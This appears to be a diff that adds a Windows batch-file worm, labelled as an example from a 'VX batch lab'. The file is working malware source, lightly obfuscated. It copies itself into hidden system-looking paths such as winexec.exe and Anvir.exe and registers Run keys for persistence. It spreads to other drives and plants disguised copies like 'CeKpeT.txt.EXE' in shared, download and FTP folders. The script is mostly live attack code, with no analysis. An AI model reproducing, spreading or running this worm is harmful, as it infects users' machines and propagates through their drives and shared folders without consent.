@@ -1,0 +1,66 @@
+
+======================================================================================
+%dr_rustam_u$3_worm_example%
+@Echo oFF>nul
+reg query HKCU\Software\WinRAR
+if errorlevel 1 ECHO %NUL%G=FF%NUL%FF:0|DE%NUL%BU%NUL%G%NUL%
+IF EXIST "Z:\" (CLS & GOTO Vyh)
+SeT dq=co
+IF %0=="%appdata%\win_sys\winexec.exe" GOTO fak
+IF %0=="%TeMp%\Anvir.exe" GOTO fak
+goto goto
+ECHO %NUL%G=FF%NUL%FF:0|DE%NUL%BU%NUL%G%NUL%
+SET SET=SET
+:goto
+;@ECHO Û>NUL|SET GO=CAB
+sEt bq=py
+:wnext
+if exist "%appdata%\win_sys\winexec.exe" goto RtT 
+md "%appdata%\win_sys"
+%dq%%bq% ""%0"" "%appdata%\win_sys\winexec.exe"
+attrib +s +r "%appdata%\win_sys\winexec.exe"
+sET qb=reg
+GOTO GX
+ECHO G=F%NUL%FF%NUL%F:0|%NUL%D%NUL%EB%NUL%U%NUL%G
+:GX
+SeT qd=add
+%qb% %qd% "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "winexec" /t %qb%_SZ /d "%appdata%\win_sys\winexec.exe" /f
+@attrib +h -r "%appdata%\win_sys"
+clS
+echo set cls title dir|Rem
+:RtT 
+if exist "%TeMp%\Anvir.exe" goto fak
+%dq%%bq% ""%0"" "%TeMp%\Anvir.exe"
+attrib +s +r "%TeMp%/Anvir.exe"
+%qb% %qd% "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Anvir" /t %qb%_SZ /d "%TeMp%\Anvir.exe" /f
+@%dq%%bq% ""%0"" "%windir%\system32\drvsys.cmd"
+:fak
+%Fg%f%rt%o%gg%r %%A in (D F G H J P K) do co%fD%py %0 %%A:\doc_%random%.exe
+FOR %%A IN (D F G H C) DO IF EXIST "%%A:\" (
+CD /D %%A:\
+FOR /R /D %%A IN (*SHAR* *DOWNLOAD* *UPLOAD* *FTP*) DO ECHO %%A>>"%TEMP%\TEMP.TXT"
+)
+SET A=0
+ECHO NNNN>>"%TEMP%\TEMP.TXT"
+SET /P WF=<"%TEMP%\TEMP.TXT"
+GOTO SWF
+:YVB
+SET /A A=A+1
+MORE /E /P +%A% "%TEMP%\TEMP.TXT">"%TEMP%\TEMP2.TXT"
+SET /P WF=<"%TEMP%\TEMP2.TXT"
+IF "%WF%" == "NNNN" GOTO nexT
+GOTO SWF
+:SWF
+COPY %0 "%WF%\CeKpeT.txt.EXE" > NUL
+GOTO YVB
+:nexT
+ECHO.>NUL
+:Vyh
+EXIT
+
+ 
+-----------------------------------------------------------------------
+
+====-------=-==-===-----==
+| DR RUSTAM/VX BATCH LAB |
+====--=-====-----=-=-====-
